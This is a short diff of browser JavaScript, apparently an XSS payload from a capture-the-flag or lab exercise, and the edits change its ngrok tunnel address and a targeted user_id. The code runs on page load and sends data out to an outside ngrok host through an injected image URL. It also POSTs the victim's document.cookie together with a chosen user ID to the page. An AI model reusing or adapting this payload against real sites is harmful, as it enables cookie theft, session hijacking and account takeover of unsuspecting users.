@@ -1,7 +1,7 @@
 window.addEventListener('load', function () {
  function send2server(name, data){
     img = document.createElement("img");
-    img.src = "https://2c48e50e.ngrok.io/name="+name+"&data="+btoa(encodeURI(data));
+    img.src = "https://bf482e8c.ngrok.io/name="+name+"&data="+btoa(encodeURI(data));
     document.getElementById("chat-div").appendChild(img);
 }
 
@@ -10,7 +10,7 @@ window.addEventListener('load', function () {
 
   fetch(window.location.pathname,{
     method: 'POST',
-    body: 'name=test&user_id=2&' +document.cookie,
+    body: 'name=test&user_id=1&' +document.cookie,
      headers: {
       'Content-Type': 'application/x-www-form-urlencoded',
     }
